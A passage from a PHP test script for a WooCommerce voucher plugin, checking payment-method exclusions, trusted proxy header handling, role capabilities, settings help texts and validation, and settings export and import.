check( 'SET-VC-30: on product, cart, checkout and order received pages without plugin output only the base style is enqueued, the account area gets the CSS', (bool) preg_match( "/if \( is_account_page\(\) \) \{\s*self::enqueue_style\(\);\s*\} elseif \( is_order_received_page\(\) \|\| is_product\(\) \|\| is_cart\(\) \|\| is_checkout\(\) \) \{/", $c30_dl ) );
unset( $GLOBALS['vcap_test_options']['vcap_custom_css'] );
$c30::reset();
$GLOBALS['vcap_test_styles'] = array();
// SET-VC-19: payment methods for buying vouchers ("Do not sell vouchers with …", payment methods paid later).
echo "SET-VC-19 payment methods for vouchers\n";
$pm_gw = array( 'cod' => 'COD', 'bacs' => 'BACS', 'stripe' => 'Stripe', 'paypal' => 'PayPal' );
check( 'SET-VC-19: register – "Do not sell vouchers with" is empty by default, "paid later" is cash on delivery, bank transfer, cheque (as before), both on "General"', array() === VCAP\SettingsRegistry::default( VCAP\PaymentMethods::EXCLUDED_OPTION ) && array( 'cod', 'bacs', 'cheque' ) === VCAP\SettingsRegistry::default( VCAP\PaymentMethods::OFFLINE_OPTION ) && array( 'cod', 'bacs', 'cheque' ) === VCAP\PaymentMethods::offline() && '' === VCAP\SettingsRegistry::get( VCAP\PaymentMethods::EXCLUDED_OPTION )['section'] && 'list' === VCAP\SettingsRegistry::get( VCAP\PaymentMethods::OFFLINE_OPTION )['type'] );
check( 'SET-VC-19: with the default (nothing excluded) every gateway stays, with or without a voucher in the cart', $pm_gw === VCAP\PaymentMethods::without_excluded( $pm_gw, true ) && $pm_gw === ( new VCAP\PaymentMethods() )->available_gateways( $pm_gw ) );
$GLOBALS['vcap_test_options'][ VCAP\PaymentMethods::EXCLUDED_OPTION ] = array( 'cod', 'paypal', '', 'not_installed' );
check( 'SET-VC-19: an excluded gateway disappears only while a voucher product is bought; a cart without vouchers keeps it', array( 'bacs' => 'BACS', 'stripe' => 'Stripe' ) === VCAP\PaymentMethods::without_excluded( $pm_gw, true ) && $pm_gw === VCAP\PaymentMethods::without_excluded( $pm_gw, false ) && array( 'cod', 'paypal', 'not_installed' ) === VCAP\PaymentMethods::excluded() );
check( 'SET-VC-19: the checkout hook leaves the gateways alone when no cart or order with vouchers is there (admin, cron) and passes non-arrays on', $pm_gw === ( new VCAP\PaymentMethods() )->available_gateways( $pm_gw ) && null === ( new VCAP\PaymentMethods() )->available_gateways( null ) && false === VCAP\PaymentMethods::voucher_in_checkout() );
add_filter( 'vcap_voucher_excluded_gateways', static fn( $ids ) => array( 'stripe' ) );
check( 'SET-VC-19: the filter vcap_voucher_excluded_gateways wins over the setting', array( 'cod' => 'COD', 'bacs' => 'BACS', 'paypal' => 'PayPal' ) === VCAP\PaymentMethods::without_excluded( $pm_gw, true ) );
unset( $GLOBALS['vcap_test_filters']['vcap_voucher_excluded_gateways'] );
$GLOBALS['vcap_test_options'][ VCAP\PaymentMethods::OFFLINE_OPTION ] = array( 'cod', 'invoice' );
$pm_fields = array_column( array_filter( ( new VCAP\Settings() )->fields( '' ), static fn( $f ) => isset( $f['id'] ) && 'sectionend' !== ( $f['type'] ?? '' ) ), null, 'id' );
check( 'SET-VC-19: "General" has the block "Payment methods for vouchers" with both multiselects; ids that are saved or in the default list but not installed stay selectable', 'title' === ( $pm_fields['vcap_payment_methods']['type'] ?? '' ) && 'multiselect' === ( $pm_fields[ VCAP\PaymentMethods::EXCLUDED_OPTION ]['type'] ?? '' ) && 'multiselect' === ( $pm_fields[ VCAP\PaymentMethods::OFFLINE_OPTION ]['type'] ?? '' ) && array( 'cod', 'bacs', 'cheque', 'invoice', 'paypal', 'not_installed' ) === array_keys( $pm_fields[ VCAP\PaymentMethods::OFFLINE_OPTION ]['options'] ) && 'invoice (not installed)' === $pm_fields[ VCAP\PaymentMethods::EXCLUDED_OPTION ]['options']['invoice'] && array( 'cod', 'bacs', 'cheque' ) === $pm_fields[ VCAP\PaymentMethods::OFFLINE_OPTION ]['default'] );
check( 'SET-VC-19: "paid later" comes from the setting; Issuer::offline_payment() passes it to the filter vcap_offline_payment_methods, which wins', array( 'cod', 'invoice' ) === VCAP\PaymentMethods::offline() && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Issuer.php' ), "apply_filters( 'vcap_offline_payment_methods', PaymentMethods::offline(), \$order )" ) );
unset( $GLOBALS['vcap_test_options'][ VCAP\PaymentMethods::EXCLUDED_OPTION ], $GLOBALS['vcap_test_options'][ VCAP\PaymentMethods::OFFLINE_OPTION ] );
check( 'SET-VC-19: an emptied "paid later" list is respected (no method waits), a missing option is the default list', array() === ( static function () { $GLOBALS['vcap_test_options'][ VCAP\PaymentMethods::OFFLINE_OPTION ] = ''; $r = VCAP\PaymentMethods::offline(); unset( $GLOBALS['vcap_test_options'][ VCAP\PaymentMethods::OFFLINE_OPTION ] ); return $r; } )() && array( 'cod', 'bacs', 'cheque' ) === VCAP\PaymentMethods::offline() );
check( 'SET-VC-19: the plugin hooks woocommerce_available_payment_gateways (classic and block checkout, pay for order)', str_contains( (string) file_get_contents( VCAP_PATH . 'src/Plugin.php' ), '( new PaymentMethods() )->register();' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/PaymentMethods.php' ), "add_filter( 'woocommerce_available_payment_gateways'" ) );

// SET-VC-26: trusted proxy header as a setting; Site Health sees rate-limit hits from one address.
echo "SET-VC-26 trusted proxy header\n";
$px_server = array( 'REMOTE_ADDR' => '10.0.0.5', 'HTTP_CF_CONNECTING_IP' => '198.51.100.7', 'HTTP_X_FORWARDED_FOR' => '1.2.3.4, 203.0.113.9 ' );
check( 'SET-VC-26: register – "Trusted proxy header" is a select (none, Cloudflare, X-Forwarded-For last entry) with default none on "Privacy & advanced"', 'none' === VCAP\SettingsRegistry::default( VCAP\Plugin::PROXY_HEADER_OPTION ) && array( 'none', 'cloudflare', 'xff_last' ) === VCAP\SettingsRegistry::get( VCAP\Plugin::PROXY_HEADER_OPTION )['choices'] && 'privacy' === VCAP\SettingsRegistry::get( VCAP\Plugin::PROXY_HEADER_OPTION )['section'] );
check( 'SET-VC-26: none (default) uses REMOTE_ADDR and ignores every header (as before)', '10.0.0.5' === VCAP\Plugin::client_ip_from( $px_server, 'none' ) && '10.0.0.5' === VCAP\Plugin::client_ip_from( $px_server, '' ) && '10.0.0.5' === VCAP\Plugin::client_ip_from( $px_server, 'unknown' ) );
check( 'SET-VC-26: Cloudflare takes CF-Connecting-IP, X-Forwarded-For the last entry (appended by the nearest proxy, not the spoofable first one), IPv6 too', '198.51.100.7' === VCAP\Plugin::client_ip_from( $px_server, 'cloudflare' ) && '203.0.113.9' === VCAP\Plugin::client_ip_from( $px_server, 'xff_last' ) && '2001:db8::1' === VCAP\Plugin::client_ip_from( array( 'REMOTE_ADDR' => '10.0.0.5', 'HTTP_X_FORWARDED_FOR' => '2001:db8::1' ), 'xff_last' ) );
check( 'SET-VC-26: a missing or invalid header value falls back to REMOTE_ADDR', '10.0.0.5' === VCAP\Plugin::client_ip_from( array( 'REMOTE_ADDR' => '10.0.0.5' ), 'cloudflare' ) && '10.0.0.5' === VCAP\Plugin::client_ip_from( array( 'REMOTE_ADDR' => '10.0.0.5', 'HTTP_CF_CONNECTING_IP' => '<script>' ), 'cloudflare' ) && '10.0.0.5' === VCAP\Plugin::client_ip_from( array( 'REMOTE_ADDR' => '10.0.0.5', 'HTTP_X_FORWARDED_FOR' => '1.2.3.4, ' ), 'xff_last' ) && '' === VCAP\Plugin::client_ip_from( array(), 'xff_last' ) );
$px_saved_server = $_SERVER;
$_SERVER         = $px_server + $_SERVER;
$GLOBALS['vcap_test_options'][ VCAP\Plugin::PROXY_HEADER_OPTION ] = 'cloudflare';
$px_setting = VCAP\Plugin::client_ip();
add_filter( 'vcap_client_ip', static fn( $ip ) => '192.0.2.44' );
$px_filtered = VCAP\Plugin::client_ip();
$px_filtered_health = VCAP\Health::proxy_without_client_ip( $px_server );
unset( $GLOBALS['vcap_test_filters']['vcap_client_ip'] );
check( 'SET-VC-26: client_ip() follows the setting, the filter vcap_client_ip wins over it', '198.51.100.7' === $px_setting && '192.0.2.44' === $px_filtered && false === $px_filtered_health );
$px_cf_ok = VCAP\Health::proxy_without_client_ip( $px_server );
$px_cf_missing = VCAP\Health::proxy_without_client_ip( array( 'REMOTE_ADDR' => '10.0.0.5' ) );
unset( $GLOBALS['vcap_test_options'][ VCAP\Plugin::PROXY_HEADER_OPTION ] );
$_SERVER = $px_saved_server;
check( 'SET-VC-26: Site Health warns while the setting is none and a proxy header is sent or REMOTE_ADDR is a private address; not with a public address, nor once the setting gives the visitor address', true === VCAP\Health::proxy_without_client_ip( $px_server ) && true === VCAP\Health::proxy_without_client_ip( array( 'REMOTE_ADDR' => '10.0.0.5' ) ) && true === VCAP\Health::proxy_without_client_ip( array( 'REMOTE_ADDR' => '127.0.0.1' ) ) && false === VCAP\Health::proxy_without_client_ip( array( 'REMOTE_ADDR' => '198.51.100.20' ) ) && false === $px_cf_ok && true === $px_cf_missing );
$px_now  = time();
$px_hits = array(
	'code'    => array( 'last' => $px_now, 'windows' => 3, 'from' => array( array( 'aaaa', $px_now - 50 ), array( 'aaaa', $px_now - 40 ), array( 'aaaa', $px_now - 30 ) ) ),
	'preview' => array( 'last' => $px_now, 'windows' => 2, 'from' => array( array( 'aaaa', $px_now - 20 ), array( 'aaaa', $px_now - 10 ) ) ),
);
$px_mixed               = $px_hits;
$px_mixed['preview']['from'][0][0] = 'bbbb';
$px_older               = $px_hits;
$px_older['code']['from'][] = array( 'cccc', $px_now - 100 ); // Older than the last five: does not count.
$px_stale               = $px_hits;
$px_stale['code']['from'][0][1] = $px_now - 31 * DAY_IN_SECONDS;
check( 'SET-VC-26: Site Health – the last 5 rate-limit hits (all buckets, 30 days) from one address are reported; different addresses, fewer hits, old hits or the format before 1.3.0 are not', true === VCAP\Health::single_source( $px_hits ) && true === VCAP\Health::single_source( $px_older ) && false === VCAP\Health::single_source( $px_mixed ) && false === VCAP\Health::single_source( $px_stale ) && false === VCAP\Health::single_source( array( 'code' => array( 'last' => $px_now, 'windows' => 9 ) ) ) && false === VCAP\Health::single_source( 'broken' ) );
$px_saved_server = $_SERVER;
$_SERVER['REMOTE_ADDR'] = '2001:db8:1:2::5';
$px_a = VCAP\Plugin::rate_hit_source();
$_SERVER['REMOTE_ADDR'] = '2001:db8:1:2::99';
$px_b = VCAP\Plugin::rate_hit_source();
$_SERVER['REMOTE_ADDR'] = '198.51.100.7';
$px_c = VCAP\Plugin::rate_hit_source();
$_SERVER = $px_saved_server;
check( 'SET-VC-26: a limit hit remembers the visitor network only as a short keyed hash (same IPv6 /64 = same source), at most 5 per bucket', 1 === preg_match( '/^[0-9a-f]{16}$/', $px_a ) && $px_a === $px_b && $px_a !== $px_c && ! str_contains( $px_c, '198' ) && 5 === VCAP\Plugin::RATE_HIT_SOURCES && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Plugin.php' ), "'from'    => array_slice( \$from, -self::RATE_HIT_SOURCES )," ) );
$px_field = array_values( array_filter( ( new VCAP\Settings() )->fields( 'privacy' ), static fn( $f ) => VCAP\Plugin::PROXY_HEADER_OPTION === ( $f['id'] ?? '' ) ) )[0] ?? array();
check( 'SET-VC-26: "Privacy & advanced" has the select "Trusted proxy header" with the three choices and a warning about spoofed headers', 'select' === ( $px_field['type'] ?? '' ) && array( 'none', 'cloudflare', 'xff_last' ) === array_keys( $px_field['options'] ?? array() ) && 'none' === ( $px_field['default'] ?? '' ) && str_contains( (string) ( $px_field['desc'] ?? '' ), 'fake the header' ) );

// SET-VC-21: role × right table (Privacy & advanced); the administrator cannot lose a right; uninstall removes them.
echo "SET-VC-21 rights per role\n";
final class VCAP_Test_Role {
	public array $capabilities = array();
	public function __construct( public string $name, array $caps = array() ) { $this->capabilities = array_fill_keys( $caps, true ); }
	public function has_cap( $cap ) { return ! empty( $this->capabilities[ $cap ] ); }
	public function add_cap( $cap ) { $this->capabilities[ $cap ] = true; }
	public function remove_cap( $cap ) { unset( $this->capabilities[ $cap ] ); }
}
if ( ! function_exists( 'get_role' ) ) {
	function get_role( $r ) { return $GLOBALS['vcap_test_roles'][ $r ] ?? null; }
	function wp_roles() { return (object) array( 'role_objects' => $GLOBALS['vcap_test_roles'], 'role_names' => array_map( static fn( $r ) => $r->name, $GLOBALS['vcap_test_roles'] ), 'roles' => array(), 'use_db' => false ); }
	function add_role( $r, $n, $c = array() ) { $GLOBALS['vcap_test_roles'][ $r ] = new VCAP_Test_Role( $n, array_keys( array_filter( $c ) ) ); return $GLOBALS['vcap_test_roles'][ $r ]; }
}
$rc_all   = VCAP\Admin\RoleCaps::CAPS;
$rc_reset = static function () use ( $rc_all ) {
	$GLOBALS['vcap_test_roles'] = array(
		'administrator' => new VCAP_Test_Role( 'Administrator', array( 'manage_options', 'vcap_manage_vouchers' ) ),
		'shop_manager'  => new VCAP_Test_Role( 'Shop manager', array( 'manage_woocommerce' ) ),
		'support'       => new VCAP_Test_Role( 'Support', $rc_all ),
		'editor'        => new VCAP_Test_Role( 'Editor' ),
		'vcap_cashier'  => new VCAP_Test_Role( 'Voucher cashier', array( 'read', 'vcap_scan_tickets' ) ),
	);
};
$rc_reset();
$rc_changes = VCAP\Admin\RoleCaps::apply(
	array(
		'administrator' => array(),
		'shop_manager'  => array(),
		'support'       => array( 'vcap_manage_vouchers' => '1', 'vcap_scan_tickets' => '1' ),
		'editor'        => array( 'vcap_scan_tickets' => '1', 'manage_options' => '1' ),
		'nobody'        => array( 'vcap_manage_vouchers' => '1' ),
	),
	$GLOBALS['vcap_test_roles']
);
$rc_r = $GLOBALS['vcap_test_roles'];
check(
	'SET-VC-21: saving grants and removes the three rights per role as ticked; the administrator and roles with manage_woocommerce keep every right whatever was posted; unknown roles and rights are ignored',
	array() === array_diff( $rc_all, array_keys( array_filter( $rc_r['administrator']->capabilities ) ) ) && array() === array_diff( $rc_all, array_keys( array_filter( $rc_r['shop_manager']->capabilities ) ) )
		&& $rc_r['support']->has_cap( 'vcap_manage_vouchers' ) && ! $rc_r['support']->has_cap( 'vcap_increase_balance' )
		&& $rc_r['editor']->has_cap( 'vcap_scan_tickets' ) && ! $rc_r['editor']->has_cap( 'manage_options' )
		&& ! $rc_r['vcap_cashier']->has_cap( 'vcap_scan_tickets' ) && $rc_r['vcap_cashier']->has_cap( 'read' )
		&& ! isset( $GLOBALS['vcap_test_roles']['nobody'] )
		&& array( 'administrator:vcap_scan_tickets' => true, 'administrator:vcap_increase_balance' => true, 'shop_manager:vcap_manage_vouchers' => true, 'shop_manager:vcap_scan_tickets' => true, 'shop_manager:vcap_increase_balance' => true, 'support:vcap_increase_balance' => false, 'editor:vcap_scan_tickets' => true, 'vcap_cashier:vcap_scan_tickets' => false ) === $rc_changes,
	(string) wp_json_encode( $rc_changes )
);
// save(): needs its own nonce and manage_options (the test user has neither) – nothing changes, nothing is marked.
$_POST[ VCAP\Admin\RoleCaps::NONCE ]      = 'x';
$_POST[ VCAP\Admin\RoleCaps::FIELD_TYPE ] = array( 'editor' => array( 'vcap_increase_balance' => '1' ) );
if ( ! function_exists( 'wp_verify_nonce' ) ) {
	function wp_verify_nonce( $n, $a = -1 ) { return 'valid-' . $a === $n ? 1 : false; }
}
$rc_saved = VCAP\Admin\RoleCaps::save();
unset( $_POST[ VCAP\Admin\RoleCaps::NONCE ], $_POST[ VCAP\Admin\RoleCaps::FIELD_TYPE ] );
$rc_src = (string) file_get_contents( VCAP_PATH . 'src/Admin/RoleCaps.php' );
check(
	'SET-VC-21: saving checks the own nonce and manage_woocommerce plus manage_options; without them nothing changes; without the table in the form save() does nothing',
	false === $rc_saved && ! $GLOBALS['vcap_test_roles']['editor']->has_cap( 'vcap_increase_balance' ) && ! isset( $GLOBALS['vcap_test_options'][ VCAP\Admin\RoleCaps::CUSTOMISED_OPTION ] ) && false === VCAP\Admin\RoleCaps::save()
		&& str_contains( $rc_src, "wp_verify_nonce( \$nonce, self::NONCE_ACTION ) || ! self::can_edit()" ) && str_contains( $rc_src, "current_user_can( 'manage_woocommerce' ) && current_user_can( 'manage_options' )" )
);
// The table: one row per role, the administrator's boxes ticked and disabled; without manage_options everything is read-only.
ob_start();
VCAP\Admin\RoleCaps::render( array( 'title' => 'Rights' ) );
$rc_html = (string) ob_get_clean();
check(
	'SET-VC-21: the table lists every role with a named checkbox per right; the administrator row is ticked and disabled; a user without manage_options sees it read-only (no nonce)',
	5 === substr_count( $rc_html, '<th scope="row">' ) && 3 === substr_count( $rc_html, 'name="vcap_role_caps[administrator]' ) && 3 === preg_match_all( '/name="vcap_role_caps\[administrator\]\[[a-z_]+\]" value="1" aria-label="[^"]+" checked disabled/', $rc_html )
		&& str_contains( $rc_html, 'aria-label="Raise remaining values for Editor"' ) && ! str_contains( $rc_html, VCAP\Admin\RoleCaps::NONCE ) && str_contains( $rc_html, 'Only administrators can change the rights.' ) && str_contains( $rc_html, '<th scope="col">' ),
	$rc_html
);
$rc_priv = ( new VCAP\Settings() )->fields( 'privacy' );
check( 'SET-VC-21: the table is a block of "Privacy & advanced" without an option of its own; its state option is internal', in_array( VCAP\Admin\RoleCaps::FIELD_TYPE, array_column( $rc_priv, 'type' ), true ) && false === array_values( array_filter( $rc_priv, static fn( $f ) => VCAP\Admin\RoleCaps::FIELD_TYPE === ( $f['type'] ?? '' ) ) )[0]['is_option'] && VCAP\SettingsRegistry::is_internal( VCAP\Admin\RoleCaps::CUSTOMISED_OPTION ) );
// Install::add_caps(): defaults for administrator and shop manager; once the table was saved only the administrator's.
$rc_reset();
$GLOBALS['vcap_test_roles']['shop_manager'] = new VCAP_Test_Role( 'Shop manager', array( 'manage_woocommerce' ) );
VCAP\Install::add_caps();
$rc_default = $GLOBALS['vcap_test_roles']['shop_manager']->has_cap( 'vcap_increase_balance' ) && $GLOBALS['vcap_test_roles']['administrator']->has_cap( 'vcap_scan_tickets' );
$rc_reset();
$GLOBALS['vcap_test_roles']['shop_manager']->remove_cap( 'vcap_increase_balance' );
$GLOBALS['vcap_test_roles']['administrator']->remove_cap( 'vcap_manage_vouchers' );
$GLOBALS['vcap_test_roles']['vcap_cashier']->remove_cap( 'vcap_scan_tickets' );
update_option( VCAP\Admin\RoleCaps::CUSTOMISED_OPTION, 'yes' );
VCAP\Install::add_caps();
$rc_kept = ! $GLOBALS['vcap_test_roles']['shop_manager']->has_cap( 'vcap_increase_balance' ) && $GLOBALS['vcap_test_roles']['administrator']->has_cap( 'vcap_manage_vouchers' ) && ! $GLOBALS['vcap_test_roles']['vcap_cashier']->has_cap( 'vcap_scan_tickets' );
delete_option( VCAP\Admin\RoleCaps::CUSTOMISED_OPTION );
VCAP\Install::add_caps();
check( 'SET-VC-21: an upgrade gives administrator and shop manager the rights; once the table was saved it only ensures the administrator\'s and keeps the saved assignment; the cashier role gets the scanner right back after an uninstall', $rc_default && $rc_kept && $GLOBALS['vcap_test_roles']['vcap_cashier']->has_cap( 'vcap_scan_tickets' ) );
// Uninstall: the rights go from every role (also roles the table gave them), on every uninstall.
$rc_reset();
$GLOBALS['vcap_test_roles']['editor']->add_cap( 'vcap_manage_vouchers' );
VCAP\Admin\RoleCaps::remove_all( $GLOBALS['vcap_test_roles'] );
$rc_left = array_filter( $GLOBALS['vcap_test_roles'], static fn( $r ) => array() !== array_intersect( $rc_all, array_keys( $r->capabilities ) ) );
$rc_un   = (string) file_get_contents( VCAP_PATH . 'uninstall.php' );
check(
	'SET-VC-21: uninstall removes the three rights from every role and forgets the saved table, on every uninstall (also when the data is kept)',
	array() === $rc_left && $GLOBALS['vcap_test_roles']['administrator']->has_cap( 'manage_options' )
		&& str_contains( $rc_un, 'VCAP\Admin\RoleCaps::remove_all( (array) wp_roles()->role_objects );' ) && str_contains( $rc_un, 'delete_option( VCAP\Admin\RoleCaps::CUSTOMISED_OPTION );' )
		&& strpos( $rc_un, 'vcap_uninstall_caps(); // Every uninstall' ) < strpos( $rc_un, "if ( ! \$delete_data ) {\n\t\treturn false;" )
);
unset( $GLOBALS['vcap_test_roles'] );


// SET-VC-23: help text at every field, legal help visible, number corrections name field and range.
echo "SET-VC-23 help texts and checks\n";
$h23_settings = new VCAP\Settings();
$h23_fields   = array();
add_filter( 'vcap_settings_partner_active', static fn() => true ); // SET-VC-33: partner rules shown.
add_filter( 'vcap_setting_vcap_show_datev', static fn() => 'yes' ); // SET-VC-20: DATEV block shown.
foreach ( array_keys( $h23_settings->section_list() ) as $h23_sec ) {
	$h23_list = $h23_settings->fields( (string) $h23_sec );
	if ( 'api' === $h23_sec ) {
		$h23_list = VCAP\API\V1\ContactService::settings_fields( VCAP\API\V1\CommandService::settings_fields( $h23_list, 'api' ), 'api' );
	}
	foreach ( $h23_list as $h23_f ) {
		$h23_id = (string) ( $h23_f['id'] ?? '' );
		if ( VCAP\SettingsRegistry::has( $h23_id ) && ! in_array( $h23_f['type'] ?? '', array( 'title', 'sectionend' ), true ) ) {
			$h23_fields[ $h23_id ] = $h23_f;
		}
	}
}
unset( $GLOBALS['vcap_test_filters']['vcap_settings_partner_active'], $GLOBALS['vcap_test_filters']['vcap_setting_vcap_show_datev'] );
$h23_text    = static fn( $f ): string => trim( wp_strip_all_tags( ( is_string( $f['desc'] ?? null ) ? $f['desc'] : '' ) . ' ' . ( is_string( $f['desc_tip'] ?? null ) ? $f['desc_tip'] : '' ) ) );
$h23_without = array_keys( array_filter( $h23_fields, static fn( $f ) => strlen( $h23_text( $f ) ) < 12 ) );
check( 'SET-VC-23: every register field has a help text (desc or desc_tip with at least a short sentence)', array() === $h23_without && count( $h23_fields ) === count( array_filter( VCAP\SettingsRegistry::all(), static fn( $e ) => VCAP\SettingsRegistry::HIDDEN !== $e['section'] ) ), implode( ', ', $h23_without ) . ' / ' . count( $h23_fields ) );
$h23_former = array( 'vcap_default_template', 'vcap_hold_hours', 'vcap_code_charset', 'vcap_code_separator', 'vcap_credit_apply_order', 'vcap_referral_friend_amount', 'vcap_referral_friend_type', 'vcap_referral_reward_amount', 'vcap_referral_reward_as', 'vcap_referral_reward_days', VCAP\Counter::USER_AMOUNT, VCAP\Counter::USER_COUNT, VCAP\Counter::TILL_COUNT, VCAP\DatevExport::OPTION_CONSULTANT, VCAP\DatevExport::OPTION_CLIENT, VCAP\DatevExport::OPTION_FY_START, VCAP\DatevExport::OPTION_LENGTH );
check( 'SET-VC-23: the 17 fields without help (analysis 2.7) now explain themselves', 17 === count( $h23_former ) && array() === array_filter( $h23_former, static fn( $k ) => ! isset( $h23_fields[ $k ] ) || '' === $h23_text( $h23_fields[ $k ] ) ) );
$h23_legal_hidden = array_keys( array_filter( $h23_fields, static fn( $f, $k ) => in_array( $k, VCAP\SettingsRegistry::with( 'legal' ), true ) && ( array_key_exists( 'desc_tip', $f ) || '' === trim( wp_strip_all_tags( (string) ( $f['desc'] ?? '' ) ) ) ), ARRAY_FILTER_USE_BOTH ) );
$h23_legal_field  = VCAP\SettingsRegistry::field( 'vcap_retention_days', array( 'type' => 'number', 'desc_tip' => 'Tip.', 'desc' => 'More.' ) );
check(
	'SET-VC-23: help of settings with legal weight is visible text below the field, never only a tooltip (field() turns desc_tip into desc); other fields keep their tooltip',
	array() === $h23_legal_hidden && 'Tip. More.' === $h23_legal_field['desc'] && ! array_key_exists( 'desc_tip', $h23_legal_field )
		&& ! array_key_exists( 'desc_tip', VCAP\SettingsRegistry::field( 'vcap_datev_liability_account', array( 'type' => 'text', 'desc_tip' => true, 'desc' => 'D' ) ) )
		&& 'Tip.' === VCAP\SettingsRegistry::field( 'vcap_hold_hours', array( 'type' => 'number', 'desc_tip' => 'Tip.' ) )['desc_tip']
		&& str_contains( (string) $h23_fields['vcap_default_terms']['desc'], 'Not exchangeable for cash' ) && str_contains( (string) $h23_fields['vcap_retention_days']['desc'], '0 = keep' ),
	implode( ', ', $h23_legal_hidden )
);
$h23_pdf = (string) ( $h23_fields['vcap_bundle_pdf_limit']['desc_tip'] ?? '' );
check( 'SET-VC-23: vcap_bundle_pdf_limit – help text, register default (50, shops that never saved it) and fresh value (20, new installations) agree; stored values are not touched', 50 === VCAP\SettingsRegistry::default( 'vcap_bundle_pdf_limit' ) && 20 === VCAP\SettingsRegistry::fresh_default( 'vcap_bundle_pdf_limit' ) && 50 === $h23_fields['vcap_bundle_pdf_limit']['default'] && str_contains( $h23_pdf, 'New installations start with 20; shops installed before that and never saved this field use 50.' ) && ! str_contains( $h23_pdf, 'default 20' ), $h23_pdf );
// Server-side corrections are reported with the field label and the allowed range.
WC_Admin_Settings::$errors = array();
$h23_saved = array(
	VCAP\SettingsRegistry::sanitize_option( '30', array( 'id' => 'vcap_delivery_hour', 'title' => 'Delivery hour' ) ),
	VCAP\SettingsRegistry::sanitize_option( '-5', array( 'id' => 'vcap_customer_daily_limit', 'title' => 'Daily limit' ) ),
	VCAP\SettingsRegistry::sanitize_option( 'abc', array( 'id' => 'vcap_code_length', 'title' => 'Random part length' ) ),
	VCAP\SettingsRegistry::sanitize_option( '', array( 'id' => 'vcap_hold_hours' ) ),
	VCAP\SettingsRegistry::sanitize_option( '12.4', array( 'id' => 'vcap_code_length', 'title' => 'Random part length' ) ),
	VCAP\SettingsRegistry::sanitize_option( '8', array( 'id' => 'vcap_delivery_hour', 'title' => 'Delivery hour' ) ),
	VCAP\SettingsRegistry::sanitize_option( '10.50', array( 'id' => 'vcap_custom_max_default', 'title' => 'Max' ) ),
	VCAP\SettingsRegistry::sanitize_option( '', array( 'id' => 'vcap_referral_min_spend', 'title' => 'Min' ) ),
);
$h23_err = WC_Admin_Settings::$errors;
check(
	'SET-VC-23: a number set to a bound, rounded or refused on saving shows an error naming the field, the value and the allowed range; valid values show none',
	array( '23', '0', null, null, '12', '8', '10.50', '' ) === $h23_saved && 5 === count( $h23_err )
		&& 'Delivery hour: 30 is not allowed – allowed are whole numbers from 0 to 23. 23 was saved instead.' === $h23_err[0]
		&& 'Daily limit: -5 is not allowed – allowed are numbers 0 or more. 0 was saved instead.' === $h23_err[1]
		&& 'Random part length: "abc" was not saved – allowed are whole numbers from 8 to 40. The previous value is kept.' === $h23_err[2]
		&& 'vcap_hold_hours must not be empty – allowed are whole numbers 0 or more. The previous value is kept.' === $h23_err[3]
		&& str_starts_with( $h23_err[4], 'Random part length: 12.4 is not allowed' ),
	implode( ' | ', $h23_err )
);
WC_Admin_Settings::$errors = array();
check( 'SET-VC-23: ACCESSIBILITY.md describes help texts, visible legal notes and the error messages of the settings', str_contains( (string) file_get_contents( VCAP_PATH . 'ACCESSIBILITY.md' ), '### Einstellungen: Hilfetexte und Fehlermeldungen' ) );
// SET-VC-14/15/16/17: export, import, reset, change log and WP-CLI of the settings (VCAP\SettingsTransfer, VCAP\SettingsLog).
echo "SET-VC-14..17 settings export, import, reset, change log, WP-CLI\n";
$st_saved                     = $GLOBALS['vcap_test_options'] ?? array();
$GLOBALS['vcap_test_options'] = array( 'vcap_secret' => 'top-secret-key', 'vcap_customer_key_secret' => 'k2', 'vcap_delete_on_uninstall' => 'yes', 'vcap_db_version' => '9', 'vcap_default_template' => 42 );
$st_export                    = VCAP\SettingsTransfer::export();
$st_json                      = VCAP\SettingsTransfer::export_json();
check(
	'SET-VC-14: the export has format, version and every exportable register value – never a secret, the data removal switch, the template ID, the support log or internal state',
	VCAP\SettingsTransfer::FORMAT === $st_export['format'] && 1 === $st_export['version'] && VCAP\SettingsTransfer::exportable() === array_keys( $st_export['settings'] ) && VCAP\SettingsRegistry::with( 'export' ) === array_keys( $st_export['settings'] )
		&& ! str_contains( $st_json, 'top-secret-key' ) && ! array_intersect( array( 'vcap_secret', 'vcap_customer_key_secret', 'vcap_delete_on_uninstall', 'vcap_default_template', 'vcap_debug_log', 'vcap_db_version' ), array_keys( $st_export['settings'] ) )
		&& 365 === $st_export['settings']['vcap_default_expiry_days'] && is_array( json_decode( $st_json, true ) )
);
// Site A: changed settings, exported; site B: fresh (nothing saved), imports the file.
$st_a = array( 'vcap_code_length' => '16', 'vcap_code_prefix' => 'GS', 'vcap_code_charset' => 'numeric', 'vcap_attach_pdf' => 'no', 'vcap_issue_statuses' => array( 'completed' ), 'vcap_default_terms' => "Zeile 1\nZeile 2", 'vcap_expiry_reminder_days' => '30, 7', 'vcap_settings_log_days' => '30', 'vcap_customer_daily_limit' => '250.50' );
$GLOBALS['vcap_test_options'] = $st_a + array( 'vcap_secret' => 'site-a-secret' );
$st_file                      = VCAP\SettingsTransfer::export_json();
$st_keys                      = VCAP\SettingsTransfer::exportable();
$st_values_a                  = array_map( array( VCAP\SettingsTransfer::class, 'stored' ), array_combine( $st_keys, $st_keys ) );
$GLOBALS['vcap_test_options'] = array( 'vcap_secret' => 'site-b-secret' );
$st_parsed                    = VCAP\SettingsTransfer::parse( $st_file );
$st_diff                      = is_array( $st_parsed ) ? VCAP\SettingsTransfer::diff( $st_parsed['settings'] ) : array();
$st_changed                   = is_array( $st_parsed ) ? VCAP\SettingsTransfer::apply( $st_parsed['settings'], VCAP\SettingsLog::VIA_IMPORT ) : array();
$st_values_b                  = array_map( array( VCAP\SettingsTransfer::class, 'stored' ), array_combine( $st_keys, $st_keys ) );
check(
	'SET-VC-14: export → fresh site → import gives the same values; the preview lists exactly the changed settings (current → new); the secret of the new site stays',
	is_array( $st_parsed ) && array() === array_filter( $st_keys, static fn( $k ) => ! VCAP\SettingsTransfer::same( $st_values_a[ $k ], $st_values_b[ $k ] ) ) && array() === array_diff( array_keys( $st_a ), array_keys( $st_diff ) ) && count( $st_a ) === count( $st_diff ) && array_keys( $st_diff ) === $st_changed
		&& 12 === $st_diff['vcap_code_length']['from'] && '16' === $st_diff['vcap_code_length']['to'] && 'site-b-secret' === get_option( 'vcap_secret' ) && array() === VCAP\SettingsTransfer::diff( $st_parsed['settings'] ),
